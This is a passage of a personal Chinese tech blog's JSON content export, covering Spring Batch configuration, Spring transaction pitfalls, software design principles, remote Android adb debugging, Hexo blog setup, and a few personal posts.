task-executor=&quot;taskExecutor&quot; throttle-limit=&quot;5&quot;&gt; &lt;batch:chunk reader=&quot;userReader&quot; writer=&quot;userWriter&quot; processor=&quot;userProcessor&quot; commit-interval=&quot;5&quot; retry-limit=&quot;10&quot;&gt; &lt;batch:retryable-exception-classes&gt; &lt;batch:include class=&quot;org.springframework.dao.DuplicateKeyException&quot;/&gt; &lt;batch:include class=&quot;java.sql.BatchUpdateException&quot;/&gt; &lt;batch:include class=&quot;java.sql.SQLException&quot;/&gt; &lt;/batch:retryable-exception-classes&gt; &lt;/batch:chunk&gt; &lt;/batch:tasklet&gt; &lt;/batch:step&gt; &lt;/batch:job&gt; &lt;bean id=&quot;taskExecutor&quot; class=&quot;org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor&quot;&gt; &lt;!-- 线程池维护线程的最少数量 --&gt; &lt;property name=&quot;corePoolSize&quot; value=&quot;100&quot;/&gt; &lt;!-- 线程池维护线程所允许的空闲时间 --&gt; &lt;property name=&quot;keepAliveSeconds&quot; value=&quot;30000&quot;/&gt; &lt;!-- 线程池维护线程的最大数量 --&gt; &lt;property name=&quot;maxPoolSize&quot; value=&quot;300&quot;/&gt; &lt;!-- 线程池所使用的缓冲队列 --&gt; &lt;property name=&quot;queueCapacity&quot; value=&quot;100&quot;/&gt; &lt;/bean&gt; 定义ItemReader &lt;bean id=&quot;userReader&quot; class=&quot;org.springframework.batch.item.file.FlatFileItemReader&quot;&gt; &lt;property name=&quot;lineMapper&quot; ref=&quot;lineMapper&quot;/&gt; &lt;property name=&quot;resource&quot; value=&quot;classpath:message/batch-data-source.csv&quot;/&gt; &lt;/bean&gt; &lt;!-- 将每行映射成对象 --&gt; &lt;bean id=&quot;lineMapper&quot; class=&quot;org.springframework.batch.item.file.mapping.DefaultLineMapper&quot;&gt; &lt;property name=&quot;lineTokenizer&quot;&gt; &lt;bean class=&quot;org.springframework.batch.item.file.transform.DelimitedLineTokenizer&quot;&gt; &lt;property name=&quot;delimiter&quot; value=&quot;,&quot;/&gt;&lt;!-- 根据某种分隔符分割 --&gt; &lt;property name=&quot;names&quot; value=&quot;id,name&quot; /&gt; &lt;/bean&gt; &lt;/property&gt; &lt;property name=&quot;fieldSetMapper&quot;&gt;&lt;!-- 将拆分后的字段映射成对象 --&gt; &lt;bean class=&quot;com.hcw.core.batch.UserFieldSetMapper&quot; /&gt; &lt;/property&gt; &lt;/bean&gt; 定义ItemWriter &lt;bean id=&quot;userWriter&quot; class=&quot;com.hcw.core.batch.MyBatchItemWriter&quot; scope=&quot;step&quot;&gt; &lt;property name=&quot;statementId&quot; value=&quot;com.hcw.core.batch.dao.UserToMapper.batchInsert&quot;/&gt; &lt;property name=&quot;sqlSessionFactory&quot; ref=&quot;sqlSessionFactoryTo&quot;/&gt; &lt;/bean&gt; 定义ItemProcessor &lt;bean id=&quot;userProcessor&quot; class=&quot;com.hcw.core.batch.UserItemProcessor&quot;/&gt; 定义jobRepository的数据源 &lt;bean id=&quot;dataRepDruidDataSource&quot; class=&quot;com.alibaba.druid.pool.DruidDataSource&quot; init-method=&quot;init&quot; destroy-method=&quot;close&quot;&gt; &lt;property name=&quot;url&quot; value=&quot;${jdbc.mysql.rep.connection.url}&quot; /&gt; &lt;property name=&quot;username&quot; value=&quot;${jdbc.mysql.rep.connection.username}&quot; /&gt; &lt;property name=&quot;password&quot; value=&quot;${jdbc.mysql.rep.connection.password}&quot; /&gt; &lt;property name=&quot;filters&quot; value=&quot;${jdbc.mysql.rep.connection.filters}&quot; /&gt; &lt;property name=&quot;maxActive&quot; value=&quot;${jdbc.mysql.rep.connection.maxActive}&quot; /&gt; &lt;property name=&quot;initialSize&quot; value=&quot;${jdbc.mysql.rep.connection.initialSize}&quot; /&gt; &lt;property name=&quot;maxWait&quot; value=&quot;${jdbc.mysql.rep.connection.maxWait}&quot; /&gt; &lt;property name=&quot;minIdle&quot; value=&quot;${jdbc.mysql.rep.connection.minIdle}&quot; /&gt; &lt;property name=&quot;timeBetweenEvictionRunsMillis&quot; value=&quot;${jdbc.mysql.rep.connection.timeBetweenEvictionRunsMillis}&quot; /&gt; &lt;property name=&quot;minEvictableIdleTimeMillis&quot; value=&quot;${jdbc.mysql.rep.connection.minEvictableIdleTimeMillis}&quot; /&gt; &lt;property name=&quot;validationQuery&quot; value=&quot;${jdbc.mysql.rep.connection.validationQuery}&quot; /&gt; &lt;property name=&quot;testWhileIdle&quot; value=&quot;${jdbc.mysql.rep.connection.testWhileIdle}&quot; /&gt; &lt;property name=&quot;testOnBorrow&quot; value=&quot;${jdbc.mysql.rep.connection.testOnBorrow}&quot; /&gt; &lt;property name=&quot;testOnReturn&quot; value=&quot;${jdbc.mysql.rep.connection.testOnReturn}&quot; /&gt; &lt;property name=&quot;poolPreparedStatements&quot; value=&quot;${jdbc.mysql.rep.connection.poolPreparedStatements}&quot; /&gt; &lt;property name=&quot;maxPoolPreparedStatementPerConnectionSize&quot; value=&quot;${jdbc.mysql.rep.connection.maxPoolPreparedStatementPerConnectionSize}&quot; /&gt; &lt;/bean&gt; 启动JOB 启动tomcat,打开启动页面 源码地址batch-framework 参考资料SpringBatch 中文文档","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"http://www.hasfun.cn/tags/Spring/"},{"name":"批处理","slug":"批处理","permalink":"http://www.hasfun.cn/tags/批处理/"},{"name":"SpringBatch","slug":"SpringBatch","permalink":"http://www.hasfun.cn/tags/SpringBatch/"}]},{"title":"2018，这一年","slug":"summary","date":"2019-01-01T02:21:19.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/01/01/summary/","link":"","permalink":"http://www.hasfun.cn/2019/01/01/summary/","excerpt":"","text":"引用习大大的祝贺词中的一句”岁月不居，时节如流”，18年就这样过去了，总结一下这年的收获。 关于读书，多读比不读好这一年，很庆幸的是，我认识了很上进的同事，他对我的影响是让我开始认识到看书的重要性，开始学会在书里寻找价值与智慧。今年我看了32本书，我也不记得自己还记得几个句子，又或者对我带来多大的影响，知乎上也有人提到“经常看书的人和不看书的人有什么区别”，我当时是这样回答的： 从我身边的例子来说，有位同事，大学不务正业，泡在金庸武侠世界里，连书中的某段武林秘籍口诀也能倒背如流,当然，他也涉及其它领域。跟他对话，他猛不丁get到一个念头，帮你把你的处境与书中某个人的遭遇相关联,并引出解决方案，这时候你就能领略到读书的用处了，书中记录的是过来人的生活经验，会帮助你解决目前的问题。 就我的感受是自己读完一本本书后，内心很充实，生活中有些问题能从书中找到答案，思想变得更加豁达了，而没有像以前看问题那么局面，自然比以前少发牢骚了，生活也更积极了。 关于工作：“凑合着”做，“凑合着”过，把自己也“凑合着”活了刚工作那会，多加班一个小时，都觉得自己吃亏了，如果再对比下别人家的公司加班晚餐与加班费，心里戾气就更严重了，对待工作也消极，演变成了“凑合”。现在仔细想想，”凑合”在我生活中扮演的戏份真的很多，学业上凑合着，工作上凑合着，说到底是对自己凑合着。在公司的每一分一秒，都是自己参与，都属于自己“刻意练习”的机会，可以想成是公司提供的带薪培训的一个很好的平台。我觉得，思想转变了，态度自然就能转变，我就会往好的方向走。 关于生活：有想法，撸起袖子，去做；而想得多而畏惧不做现如今，逃离北上广的人太多了，18年这一年，在上海，作为外地人，我需要为自己留在上海做一些努力。儿子二岁了，面临上幼儿园的问题，外地人上本地幼儿园需要居住证积分，我办了居住证、辗转2次办成了积分。为了以后出行的方便，我把驾照也考了，就不提我苦逼的考了一年的经过了。","categories":[{"name":"生活","slug":"生活","permalink":"http://www.hasfun.cn/categories/生活/"}],"tags":[{"name":"年度总结","slug":"年度总结","permalink":"http://www.hasfun.cn/tags/年度总结/"}]},{"title":"结合项目，谈谈软件设计原则","slug":"softdesign","date":"2018-12-19T16:22:41.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2018/12/20/softdesign/","link":"","permalink":"http://www.hasfun.cn/2018/12/20/softdesign/","excerpt":"","text":"从事开发这么多年，陆陆续续开发了N个系统了。对软件设计原则，一直没有认真深入的探讨过，当熟读这些原则，结合项目，发现很多违背设计的地方，作为优秀的研发，应该早点跟三字经一样熟读这些原则才对啊。下面我结合最近的项目谈谈自己的见解。 开闭原则官方解释 对扩展是开放的，对修改是关闭的。简单地说，就是你要提供这样的函数方法或者类，你可以进行重载，复写，但是不需要修改。例如，刚开始，火车票电子票出票流程，我在controller层调用business层提供的出票方法。设计的时候，预测到后期还有其他票种，我抽象出一个IOccupyBusiness接口，里面就一个请求占位方法，实现该接口新建实现类EticketOccupyBusiness，在occupy（）写电子票的业务。过了不久，产品提了一个配送票的出票需求，我只需要添加一个实现IOccupyBusiness的实现类DeliveryOccupyBusiness，在occupy（）写配送票的业务，我并没有修改已有类，和方法，复合了开闭原则。 接口隔离原则客户端不应该依赖它不需要的接口；一个类对另一个类的依赖应该建立在最小的接口上。简单说，不要给调用方暴露它不需要调用的方法。还拿上述的例子，如果遵循单一职责原则，请求占位，与占位反馈，可以设计成同个接口的不同方法。如果需求是这样的，配送票的占位是虚占，不需要耗时的请求12306实占，所以可以占位接口设计成同步反馈结果，则没有异步反馈的方法。那么配送票的实现类就多暴露出一个占位反馈的方法，不符合接口隔离原则，于是我又将占位接口，粒度细化了，分占位请求接口，占位反馈接口。这样，占位的实现类就不会实现多余的接口了。 单一职责原则官方定义：有且仅有一个让类变化的原因。通俗地说，就是一个类只负责一个职责，比如上面我们谈到的，占位的类，不能同时有出票的功能。单一职责与接口隔离原则有点类似，单一职责偏向于职能，接口隔离偏向于接口粒度。 里氏替换原则官方定义：所以引用基类的地方必须透明的使用子类对象通俗地说，就是子类可以扩展父类的功能，但不能改变父类的功能，即不能重载、复写父类的方法 迪米特法则官方定义：一个对象应该对其他对象保持最少的了解 依赖倒置原则官方定义 译文：高层模块不应该依赖于低层模块，它们应该依赖于抽象。抽象不应该依赖于细节，细节应该依赖于抽象。 基于以上学习，我在项目里面实现了这样类图","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"软件设计原则","slug":"软件设计原则","permalink":"http://www.hasfun.cn/tags/软件设计原则/"}]},{"title":"spring声明式事务失效的分析过程","slug":"aop","date":"2018-12-16T11:56:40.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2018/12/16/aop/","link":"","permalink":"http://www.hasfun.cn/2018/12/16/aop/","excerpt":"","text":"问题的背景在途牛，庆幸的是遇到了几个很正面的人，我也是从阅读其中一位同事的博客才发现了spring声明式事务的这个坑，说实话，我平时开发很少用事务，因为不好控制粒度，事务也是高并发的绊脚石。 问题的现象为了理解方便，下面我用伪代码说明问题详细 Class exampleService{ //不加事务，本身不需要事务介入 public void methodA（）{ //耗时操作 ······ //调用B methodB（）； ······ } //声明了事务 @Transactional public void methodB（）{ insert(); throw new RuntimeException(&quot;操作db失败&quot;) } } 运行完代码后，现象是发现methodB的插入的数据没有回滚，像我一样不知道的同学就纳闷了，下面来具体分析下为啥出现事务无效的现象。 问题的分析这里来复习一下spring的声明式事务，无非就是spring的二大核心之一：AOP。 AOP的实现原理是java的动态代理。 spring实现动态代理有二种方式，其中一个就是cglib，另一个是jdk代理。 cglib的原理是jvm调用native方法即ASM，操作class字节码另生成代理类。 AOP注解的方法，生成的代理类，并在方法执行前，加入事务的开启，执行后加入事务提交操作 基于这些认知，我们看spring的声明式事务为什么失效。exampleService有二个方法：methodA 是普通方法，methodB是另一个声明了事务方法，class编译出了一个AOP代理类exampleServiceProxy,上述出现问题的调用关系是： exampleService.methodA（）调用的是内部方法exampleService.methodB(). 由此看出methodB并没有被Proxy类通知到。 正确的调用关系是： exampleServiceProxy.methodA()--&gt;exampleServiceProxy.methodB(). 怎么避免此类问题知道了原理，我们解决此类问题的方法，要么是新建一个类并将methodB移进来。要么是用编程式事务。 题外话 说下最近发生的事情，不喜跳过。这段时间工作比较忙，每天有6个小时的有效工作时间，在和南京总部的度假团队，一起开发火车票改签项目，说下这个项目的感受，又是一堆的CURD，这也是敲业务代码的弊端。我想避免温水煮青蛙，突破一下自己，改变了以往的开发习惯，先把以前大冰哥的改签代码，用Visio将业务流程画了一遍，我也不清楚这样有什么好处，有个“上海交大”的同事告诉我这样用处大，只能自己体会，我想人家那么优秀的学历说的话总归有点道理的。等我画完整个流程图后，渐渐的有了点启发，一边心里骂着之前代码结构的设计，一边寻思着开始代码的重构,目前正在紧张的开发中。回过头来想画流程图的好处，我就觉得，看代码的速度放慢了，思考空间也更大了些，于是启发就更多了些。 5/8号昨天面试的时候，被面试官问到这块知识，面试官问如果获取代理对象的目标对象？我不知道了，不过现在知道了。像上面那类问题，另外一个解决方案就是，直接获取spring容器的代理对象： Class exampleService{ //不加事务，本身不需要事务介入 public void methodA（）{ //耗时操作 ······ //调用B ((BaseClass)SpringUtil.getBean(&quot;exampleService&quot;)).methodB（）； ······ } //声明了事务 @Transactional public void methodB（）{ insert(); throw new RuntimeException(&quot;操作db失败&quot;) } } 如果获取代理对象的目标对象？我不好用语言表达清楚，先贴个别人写的解答吧在spring中获取代理对象代理的目标对象工具类 参考资料：Spring的编程式事务和声明式事务Spring aop的实现原理Java动态代理机制详解（JDK 和CGLIB，Javassist，ASM）","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"http://www.hasfun.cn/tags/Spring/"}]},{"title":"推荐适合敲代码时候听的空灵音乐","slug":"music","date":"2018-12-16T07:31:37.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2018/12/16/music/","link":"","permalink":"http://www.hasfun.cn/2018/12/16/music/","excerpt":"","text":"日常时间大多数都在敲代码中，当周围环境比较纷杂吵闹，又或者内心比较杂乱烦躁的时候，我都会放上一小段音乐来平复一下自己，通常我会听一些轻音乐，我喜欢青山流水的旋律，或者简简单单的下雨的声音，个人觉得很适合敲代码的时候听。 现在流行的歌手，参差不齐，商业化向导向的市场已经很难诞生出一个纯粹做音乐的人了，如果听音乐，我个人建议听像朴树、许巍这样的灵魂歌者，他们的音乐简简单单是自己某个阶段的内心表达。 轻音乐，我建议听下久石让的，最近发现班得瑞的音乐也很好听，推荐下。 点击听《班得瑞的轻音乐》","categories":[{"name":"生活","slug":"生活","permalink":"http://www.hasfun.cn/categories/生活/"}],"tags":[{"name":"音乐","slug":"音乐","permalink":"http://www.hasfun.cn/tags/音乐/"}]},{"title":"Android开发调试远程连接设备","slug":"adb","date":"2018-12-02T15:45:16.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2018/12/02/adb/","link":"","permalink":"http://www.hasfun.cn/2018/12/02/adb/","excerpt":"","text":"最近在做一个Android-PAD项目，之前本地调试，基本靠sdk模拟器，或者数据线连接手机，学会了新招，可以远程连接设备进行调试，即远程adb。 前提条件：一台Android设备，并且ROOT su setprop service.adb.tcp.port 9999 #设置端口，默认是5555 stop adbd start adbd netstat#看下adb端口是否打开 最后在终端执行 C:\\Users\\Administrator\\AppData\\Local\\Android\\Sdk\\platform-tools&gt;adb connect 192.168.2.104 9999连接成功","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://www.hasfun.cn/tags/Android/"}]},{"title":"MarkDown编辑器","slug":"markdown","date":"2018-12-02T13:37:33.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2018/12/02/markdown/","link":"","permalink":"http://www.hasfun.cn/2018/12/02/markdown/","excerpt":"","text":"hexo博客搭建好了，可以开始写文章了，所谓“工欲善其事必先利其器”，推荐在线MarkDown编辑器，可以立即预览文章样式。 ==2019/4/27== 发现有道云笔记的markdown工具，提供了一些自动化的标签工具，让写作更方便了","categories":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/categories/工具/"}],"tags":[{"name":"MarkDown","slug":"MarkDown","permalink":"http://www.hasfun.cn/tags/MarkDown/"}]},{"title":"hexo+GitHub搭建个人博客","slug":"hello-world","date":"2018-12-01T13:04:58.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2018/12/01/hello-world/","link":"","permalink":"http://www.hasfun.cn/2018/12/01/hello-world/","excerpt":"","text":"做IT的没有一个自己的博客，不像话，于是现学现卖搭建了这个博客，记录下来，种下大树，便于后人乘凉 准备工作 电脑一台，本文以win7为例 给电脑安装git 安装node.js 申请GitHub 安装hexo在我的电脑里面建一个文件夹blog然后进入blog文件夹，右击选择“Git Bash”输入命令 npm install -g cnpm --registry=https://registry.npm.taobao.org#安装npm cnpm install -g hexo-cli cnpm install hexo --save hexo -v #安装完成后，在输入命令，验证是否安装正确 启动hexohexo init #初始化hexo cnpm install #安装生成器 hexo s -g #运行hexo,以后要在本地运行博客只要输入该命令即可 打开浏览器，输入localhost:4000,就可以在本地看到你的个人博客了停止运行按住Ctrl+C键即可停止 配置博客使用notepad++编辑器打开blog/_config.yml文件，进行配置 #博客名称 title: 我的博客 #副标题 subtitle: 一天进步一点 #简介 description: 记录生活点滴 #博客作者 author: John Doe #博客语言 language: zh-CN #时区 timezone: #博客地址,与申请的GitHub一致 url: http://elfwalk.github.io root: / #博客链接格式 permalink: :year/:month/:day/:title/ permalink_defaults: source_dir: source public_dir: public tag_dir: tags archive_dir: archives category_dir: categories code_dir: downloads/code i18n_dir: :lang skip_render: new_post_name: :title.md # File name of new posts default_layout: post titlecase: false # Transform title into titlecase external_link: true # Open external links in new tab filename_case: 0 render_drafts: false post_asset_folder: false relative_link: false future: true highlight: enable: true line_number: true auto_detect: true tab_replace: default_category: uncategorized category_map: tag_map: #日期格式 date_format: YYYY-MM-DD time_format: HH:mm:ss #分页，每页文章数量 per_page: 10 pagination_dir: page #博客主题 theme: landscape #发布设置 deploy: type: git #elfwalk改为你的github用户名 repository: https://github.com/huangchunwu/huangchunwu.github.io.git branch: master 编写文章hexo new &quot;new article&quot; 之后在source/_posts目录下面，多了一个new-article.md的文件打开之后我们会看到： title: new article date: 2014-11-01 20:10:33 tags: --- 文件的开头是属性，采用统一的yaml格式，用三条短横线分隔。下面是文章正文。文章的正文支持markdown格式，建议你先学习一下它的语法。markdown不像html似的一大堆标签，很简单，只有几个符号。新建、删除或修改文章后，不需要重启hexo server，刷新一下即可预览。 hexo clean # 删除已经生成的静态页面 hexo generate #生成静态网页 hexo deploy #部署到GitHub hexo g -d #也可简写为（一起执行上边两个命令）","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://www.hasfun.cn/tags/hexo/"}]}],"categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"},{"name":"生活","slug":"生活","permalink":"http://www.hasfun.cn/categories/生活/"},{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/categories/工具/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.hasfun.cn/tags/Linux/"},{"name":"减肥","slug":"减肥","permalink":"http://www.hasfun.cn/tags/减肥/"},{"name":"设计模式","slug":"设计模式","permalink":"http://www.hasfun.cn/tags/设计模式/"},{"name":"hbase","slug":"hbase","permalink":"http://www.hasfun.cn/tags/hbase/"},{"name":"JVM","slug":"JVM","permalink":"http://www.hasfun.cn/tags/JVM/"},{"name":"Java新特性","slug":"Java新特性","permalink":"http://www.hasfun.cn/tags/Java新特性/"},{"name":"dubbo","slug":"dubbo","permalink":"http://www.hasfun.cn/tags/dubbo/"},{"name":"IDEA技巧","slug":"IDEA技巧","permalink":"http://www.hasfun.cn/tags/IDEA技巧/"},{"name":"打字","slug":"打字","permalink":"http://www.hasfun.cn/tags/打字/"},{"name":"maven","slug":"maven","permalink":"http://www.hasfun.cn/tags/maven/"},{"name":"装箱与拆箱","slug":"装箱与拆箱","permalink":"http://www.hasfun.cn/tags/装箱与拆箱/"},{"name":"棉花糖","slug":"棉花糖","permalink":"http://www.hasfun.cn/tags/棉花糖/"},{"name":"避坑指南","slug":"避坑指南","permalink":"http://www.hasfun.cn/tags/避坑指南/"},{"name":"POI","slug":"POI","permalink":"http://www.hasfun.cn/tags/POI/"},{"name":"大数据","slug":"大数据","permalink":"http://www.hasfun.cn/tags/大数据/"},{"name":"源码分析","slug":"源码分析","permalink":"http://www.hasfun.cn/tags/源码分析/"},{"name":"elastic-job","slug":"elastic-job","permalink":"http://www.hasfun.cn/tags/elastic-job/"},{"name":"闲言杂语","slug":"闲言杂语","permalink":"http://www.hasfun.cn/tags/闲言杂语/"},{"name":"zookeeper","slug":"zookeeper","permalink":"http://www.hasfun.cn/tags/zookeeper/"},{"name":"Spring","slug":"Spring","permalink":"http://www.hasfun.cn/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://www.hasfun.cn/tags/SpringBoot/"},{"name":"规范命名","slug":"规范命名","permalink":"http://www.hasfun.cn/tags/规范命名/"},{"name":"Redis","slug":"Redis","permalink":"http://www.hasfun.cn/tags/Redis/"},{"name":"mongoDB","slug":"mongoDB","permalink":"http://www.hasfun.cn/tags/mongoDB/"},{"name":"docker","slug":"docker","permalink":"http://www.hasfun.cn/tags/docker/"},{"name":"营销平台","slug":"营销平台","permalink":"http://www.hasfun.cn/tags/营销平台/"},{"name":"Mysql","slug":"Mysql","permalink":"http://www.hasfun.cn/tags/Mysql/"},{"name":"ActiveMq","slug":"ActiveMq","permalink":"http://www.hasfun.cn/tags/ActiveMq/"},{"name":"分布式事务","slug":"分布式事务","permalink":"http://www.hasfun.cn/tags/分布式事务/"},{"name":"分布式一致性","slug":"分布式一致性","permalink":"http://www.hasfun.cn/tags/分布式一致性/"},{"name":"线程池","slug":"线程池","permalink":"http://www.hasfun.cn/tags/线程池/"},{"name":"GC","slug":"GC","permalink":"http://www.hasfun.cn/tags/GC/"},{"name":"HashMap","slug":"HashMap","permalink":"http://www.hasfun.cn/tags/HashMap/"},{"name":"分库分表","slug":"分库分表","permalink":"http://www.hasfun.cn/tags/分库分表/"},{"name":"缓存","slug":"缓存","permalink":"http://www.hasfun.cn/tags/缓存/"},{"name":"协程","slug":"协程","permalink":"http://www.hasfun.cn/tags/协程/"},{"name":"面试","slug":"面试","permalink":"http://www.hasfun.cn/tags/面试/"},{"name":"UML","slug":"UML","permalink":"http://www.hasfun.cn/tags/UML/"},{"name":"数据迁移","slug":"数据迁移","permalink":"http://www.hasfun.cn/tags/数据迁移/"},{"name":"隔离级别","slug":"隔离级别","permalink":"http://www.hasfun.cn/tags/隔离级别/"},{"name":"volatile","slug":"volatile","permalink":"http://www.hasfun.cn/tags/volatile/"},{"name":"synchronized","slug":"synchronized","permalink":"http://www.hasfun.cn/tags/synchronized/"},{"name":"类的加载机制","slug":"类的加载机制","permalink":"http://www.hasfun.cn/tags/类的加载机制/"},{"name":"钉钉","slug":"钉钉","permalink":"http://www.hasfun.cn/tags/钉钉/"},{"name":"生活感悟","slug":"生活感悟","permalink":"http://www.hasfun.cn/tags/生活感悟/"},{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/tags/工具/"},{"name":"JUC","slug":"JUC","permalink":"http://www.hasfun.cn/tags/JUC/"},{"name":"Threadlocal","slug":"Threadlocal","permalink":"http://www.hasfun.cn/tags/Threadlocal/"},{"name":"并发","slug":"并发","permalink":"http://www.hasfun.cn/tags/并发/"},{"name":"forkJoin","slug":"forkJoin","permalink":"http://www.hasfun.cn/tags/forkJoin/"},{"name":"Guava","slug":"Guava","permalink":"http://www.hasfun.cn/tags/Guava/"},{"name":"hexo","slug":"hexo","permalink":"http://www.hasfun.cn/tags/hexo/"},{"name":"批处理","slug":"批处理","permalink":"http://www.hasfun.cn/tags/批处理/"},{"name":"SpringBatch","slug":"SpringBatch","permalink":"http://www.hasfun.cn/tags/SpringBatch/"},{"name":"年度总结","slug":"年度总结","permalink":"http://www.hasfun.cn/tags/年度总结/"},{"name":"软件设计原则","slug":"软件设计原则","permalink":"http://www.hasfun.cn/tags/软件设计原则/"},{"name":"音乐","slug":"音乐","permalink":"http://www.hasfun.cn/tags/音乐/"},{"name":"Android","slug":"Android","permalink":"http://www.hasfun.cn/tags/Android/"},{"name":"MarkDown","slug":"MarkDown","permalink":"http://www.hasfun.cn/tags/MarkDown/"}]}